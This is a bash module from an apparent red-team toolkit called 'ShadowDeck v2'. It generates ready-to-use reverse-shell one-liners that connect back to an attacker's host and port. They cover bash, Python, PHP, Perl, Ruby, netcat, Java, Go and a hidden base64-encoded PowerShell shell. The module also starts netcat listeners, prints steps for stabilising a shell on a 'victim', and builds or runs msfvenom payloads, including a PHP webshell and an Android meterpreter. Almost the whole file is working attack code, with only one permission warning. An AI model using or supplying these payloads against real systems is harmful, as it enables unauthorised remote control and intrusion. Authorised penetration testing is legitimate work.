#!/usr/bin/env bash
# ShadowDeck v2 — Red Team | Reverse Shells Module
# modules/red/revshells.sh

RESET='\033[0m'
GREEN='\033[38;5;82m'
GREEN_DIM='\033[38;5;22m'
GREEN_HI='\033[38;5;118m'
RED='\033[38;5;196m'
AMBER='\033[38;5;214m'
CYAN='\033[38;5;51m'
BOLD='\033[1m'

LOGS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../logs" && pwd)"
mkdir -p "$LOGS_DIR"

dim_line()  { echo -e "${GREEN_DIM}$(printf '─%.0s' {1..70})${RESET}"; }
thick_line(){ echo -e "${GREEN}$(printf '═%.0s' {1..70})${RESET}"; }
info()  { echo -e "${CYAN}[*]${RESET} $1"; }
ok()    { echo -e "${GREEN}[+]${RESET} $1"; }
warn()  { echo -e "${AMBER}[!]${RESET} $1"; }
err()   { echo -e "${RED}[✗]${RESET} $1"; }
log()   { echo "[$(date '+%Y-%m-%d %H:%M:%S')] [REVSHELLS] $1" >> "$LOGS_DIR/shadowdeck.log"; }
press_enter() { echo -e "\n${GREEN_DIM}  Press Enter to return...${RESET}"; read -r; }

# ── Get LHOST/LPORT ───────────────────────────────────────────
get_lhost_lport() {
    # Auto-detect local IP
    local auto_ip
    auto_ip=$(hostname -I 2>/dev/null | awk '{print $1}')

    echo ""
    echo -ne "  ${GREEN}LHOST${RESET} ${GREEN_DIM}[detected: $auto_ip]${RESET} (Enter to use): "
    read -r LHOST
    LHOST="${LHOST:-$auto_ip}"

    echo -ne "  ${GREEN}LPORT${RESET} [4444]: "
    read -r LPORT
    LPORT="${LPORT:-4444}"

    ok "LHOST=$LHOST  LPORT=$LPORT"
    log "Shell generated for $LHOST:$LPORT"
}

# ── Display + Copy helper ─────────────────────────────────────
show_shell() {
    local label="$1"
    local payload="$2"
    echo ""
    thick_line
    echo -e "  ${GREEN_HI}${BOLD}$label${RESET}"
    thick_line
    echo -e "\n  ${CYAN}$payload${RESET}\n"
    dim_line
    echo -ne "  ${GREEN_DIM}Copy to clipboard? [y/N]: ${RESET}"
    read -r copy
    if [[ "$copy" =~ ^[Yy]$ ]]; then
        if command -v xclip &>/dev/null; then
            echo -n "$payload" | xclip -selection clipboard
            ok "Copied to clipboard (xclip)"
        elif command -v clip.exe &>/dev/null; then
            echo -n "$payload" | clip.exe
            ok "Copied to clipboard (Windows clip)"
        else
            warn "No clipboard tool found. Install xclip or use clip.exe"
        fi
    fi
    # Save to logs
    echo "$label: $payload" >> "$LOGS_DIR/revshells_$(date +%Y%m%d).txt"
}

# ── SHELL GENERATOR ───────────────────────────────────────────
run_generator() {
    while true; do
        clear; thick_line
        echo -e "  ${RED}${BOLD}[REVERSE SHELLS] Generator${RESET}"
        thick_line
        echo -e "  ${GREEN}[1]${RESET}  Bash TCP"
        echo -e "  ${GREEN}[2]${RESET}  Bash UDP"
        echo -e "  ${GREEN}[3]${RESET}  Python 3"
        echo -e "  ${GREEN}[4]${RESET}  Python 2"
        echo -e "  ${GREEN}[5]${RESET}  PHP"
        echo -e "  ${GREEN}[6]${RESET}  Perl"
        echo -e "  ${GREEN}[7]${RESET}  Ruby"
        echo -e "  ${GREEN}[8]${RESET}  Netcat (traditional)"
        echo -e "  ${GREEN}[9]${RESET}  Netcat (OpenBSD / -e missing)"
        echo -e "  ${GREEN}[10]${RESET} PowerShell (Windows)"
        echo -e "  ${GREEN}[11]${RESET} Java"
        echo -e "  ${GREEN}[12]${RESET} Golang"
        echo -e "  ${GREEN}[13]${RESET} All shells for target (dump all)"
        dim_line
        echo -e "  ${GREEN_DIM}[0] Back${RESET}"
        dim_line
        echo -ne "\n  ${GREEN_HI}shadow@revshells${RESET}${GREEN} > ${RESET}"
        read -r choice

        [[ "$choice" == "0" ]] && break
        [[ -z "$choice" ]] && continue

        get_lhost_lport

        case "$choice" in
            1)
                show_shell "Bash TCP" \
                    "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
                ;;
            2)
                show_shell "Bash UDP" \
                    "bash -i >& /dev/udp/$LHOST/$LPORT 0>&1"
                ;;
            3)
                show_shell "Python 3" \
                    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
                ;;
            4)
                show_shell "Python 2" \
                    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
                ;;
            5)
                show_shell "PHP" \
                    "php -r '\$s=fsockopen(\"$LHOST\",$LPORT);\$proc=proc_open(\"/bin/sh -i\",array(0=>\$s,1=>\$s,2=>\$s),\$pipes);'"
                ;;
            6)
                show_shell "Perl" \
                    "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
                ;;
            7)
                show_shell "Ruby" \
                    "ruby -rsocket -e 'f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
                ;;
            8)
                show_shell "Netcat (traditional -e)" \
                    "nc -e /bin/sh $LHOST $LPORT"
                ;;
            9)
                show_shell "Netcat (OpenBSD / no -e)" \
                    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
                ;;
            10)
                local b64
                b64=$(echo -n "\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | iconv -t UTF-16LE | base64 -w 0)
                show_shell "PowerShell (Base64 encoded)" \
                    "powershell -nop -w hidden -e $b64"
                ;;
            11)
                show_shell "Java" \
                    "r = Runtime.getRuntime(); p = r.exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done\"}); p.waitFor();"
                ;;
            12)
                show_shell "Golang" \
                    "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$LHOST:$LPORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/sh.go && go run /tmp/sh.go"
                ;;
            13)
                # Dump all
                clear; thick_line
                echo -e "  ${RED}${BOLD}ALL SHELLS — $LHOST:$LPORT${RESET}"
                thick_line
                echo -e "\n${GREEN}Bash TCP:${RESET}"
                echo -e "  ${CYAN}bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1${RESET}"
                echo -e "\n${GREEN}Python3:${RESET}"
                echo -e "  ${CYAN}python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'${RESET}"
                echo -e "\n${GREEN}PHP:${RESET}"
                echo -e "  ${CYAN}php -r '\$s=fsockopen(\"$LHOST\",$LPORT);\$proc=proc_open(\"/bin/sh -i\",array(0=>\$s,1=>\$s,2=>\$s),\$pipes);'${RESET}"
                echo -e "\n${GREEN}Netcat (no -e):${RESET}"
                echo -e "  ${CYAN}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f${RESET}"
                echo -e "\n${GREEN}Perl:${RESET}"
                echo -e "  ${CYAN}perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${RESET}"
                echo ""
                ;;
            *) warn "Invalid option"; sleep 0.8; continue ;;
        esac
        press_enter
    done
}

# ── LISTENER ─────────────────────────────────────────────────
run_listener() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[REVERSE SHELLS] Netcat Listener${RESET}"
    thick_line
    echo -ne "  ${GREEN}Port${RESET} [4444]: "; read -r PORT
    PORT="${PORT:-4444}"

    echo ""
    echo -e "  ${GREEN}[1]${RESET} Basic nc listener"
    echo -e "  ${GREEN}[2]${RESET} rlwrap nc listener   ${GREEN_DIM}(stable — arrow keys work)${RESET}"
    echo -ne "\n  ${GREEN_HI}listener${RESET}${GREEN} > ${RESET}"
    read -r ltype

    echo ""
    case "$ltype" in
        1)
            info "Starting: ${CYAN}nc -lvnp $PORT${RESET}"
            log "Listener started on $PORT (nc)"
            nc -lvnp "$PORT"
            ;;
        2)
            if command -v rlwrap &>/dev/null; then
                info "Starting: ${CYAN}rlwrap nc -lvnp $PORT${RESET}"
                log "Listener started on $PORT (rlwrap)"
                rlwrap nc -lvnp "$PORT"
            else
                warn "rlwrap not found — install: sudo apt install rlwrap"
                info "Falling back to plain nc..."
                nc -lvnp "$PORT"
            fi
            ;;
        *)
            warn "Invalid — using basic nc"
            nc -lvnp "$PORT"
            ;;
    esac
    press_enter
}

# ── SHELL STABILIZATION GUIDE ─────────────────────────────────
run_stabilize() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[REVERSE SHELLS] Shell Stabilization${RESET}"
    thick_line
    cat << 'EOF'

  After catching a raw shell — stabilize it so Ctrl+C won't kill,
  arrow keys work, and tab-completion is active.

  ── METHOD 1: Python PTY (most common) ──────────────────────

  Step 1 (on victim):
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    (try python if python3 fails)

  Step 2 (Ctrl+Z to background the shell):
    ^Z

  Step 3 (on your machine):
    stty raw -echo; fg

  Step 4 (back in shell):
    export TERM=xterm
    export SHELL=bash

  ── METHOD 2: Script ────────────────────────────────────────

  On victim:
    script /dev/null -c bash
  Then Ctrl+Z → stty raw -echo; fg → export TERM=xterm

  ── METHOD 3: socat (fully interactive) ─────────────────────

  On your machine:
    socat file:`tty`,raw,echo=0 tcp-listen:4444

  On victim:
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444

  ── RESET TERMINAL (if display breaks) ──────────────────────

    reset
    stty rows 40 cols 150
    (match your actual terminal size)

  ── CHECK TERMINAL SIZE ──────────────────────────────────────

  On your machine first:
    stty size   → gives rows cols

  Then in victim shell:
    stty rows XX cols YY

EOF
    press_enter
}

# ── MSF VENOM HELPER ─────────────────────────────────────────
run_msfvenom() {
    clear; thick_line
    echo -e "  ${RED}${BOLD}[REVERSE SHELLS] MSFVenom Payload Generator${RESET}"
    thick_line
    echo -ne "  ${GREEN}LHOST${RESET}: "; read -r LHOST
    echo -ne "  ${GREEN}LPORT${RESET} [4444]: "; read -r LPORT
    LPORT="${LPORT:-4444}"

    echo ""
    echo -e "  ${GREEN}[1]${RESET} Linux ELF binary"
    echo -e "  ${GREEN}[2]${RESET} Windows EXE"
    echo -e "  ${GREEN}[3]${RESET} PHP webshell"
    echo -e "  ${GREEN}[4]${RESET} Python script"
    echo -e "  ${GREEN}[5]${RESET} ASP/ASPX"
    echo -e "  ${GREEN}[6]${RESET} Android APK"
    echo -ne "\n  ${GREEN_HI}msfvenom${RESET}${GREEN} > ${RESET}"
    read -r choice

    local cmd=""
    case "$choice" in
        1) cmd="msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf" ;;
        2) cmd="msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe" ;;
        3) cmd="msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php" ;;
        4) cmd="msfvenom -p cmd/unix/reverse_python LHOST=$LHOST LPORT=$LPORT -f raw -o shell.py" ;;
        5) cmd="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx" ;;
        6) cmd="msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > shell.apk" ;;
        *) warn "Invalid"; press_enter; return ;;
    esac

    echo ""
    info "Command: ${CYAN}$cmd${RESET}"
    dim_line
    echo -ne "  ${GREEN_DIM}Run it now? [y/N]: ${RESET}"
    read -r run_now
    if [[ "$run_now" =~ ^[Yy]$ ]]; then
        if command -v msfvenom &>/dev/null; then
            log "CMD: $cmd"
            eval "$cmd"
            ok "Payload generated."
        else
            err "msfvenom not found. Install: sudo apt install metasploit-framework"
        fi
    fi
    press_enter
}

# ── MAIN MENU ─────────────────────────────────────────────────
while true; do
    clear; thick_line
    echo -e "  ${RED}${BOLD}[ RED TEAM → REVERSE SHELLS ]${RESET}"
    thick_line
    echo -e "  ${GREEN}[1]${RESET} Shell Generator      ${GREEN_DIM}— bash/py/php/perl/ruby/nc/ps/java/go${RESET}"
    echo -e "  ${GREEN}[2]${RESET} Start NC Listener    ${GREEN_DIM}— nc / rlwrap listener${RESET}"
    echo -e "  ${GREEN}[3]${RESET} Shell Stabilization  ${GREEN_DIM}— pty, script, socat methods${RESET}"
    echo -e "  ${GREEN}[4]${RESET} MSFVenom Helper      ${GREEN_DIM}— generate payloads (elf/exe/php/apk)${RESET}"
    dim_line
    echo -e "  ${GREEN_DIM}[0] Back to Dashboard${RESET}"
    dim_line
    echo ""
    warn "Only use against targets you own or have permission to test."
    dim_line
    echo -ne "\n  ${GREEN_HI}shadow@revshells${RESET}${GREEN} > ${RESET}"
    read -r choice

    case "$choice" in
        1) run_generator ;;
        2) run_listener ;;
        3) run_stabilize ;;
        4) run_msfvenom ;;
        0) exit 0 ;;
        *) warn "Invalid option"; sleep 0.8 ;;
    esac
done
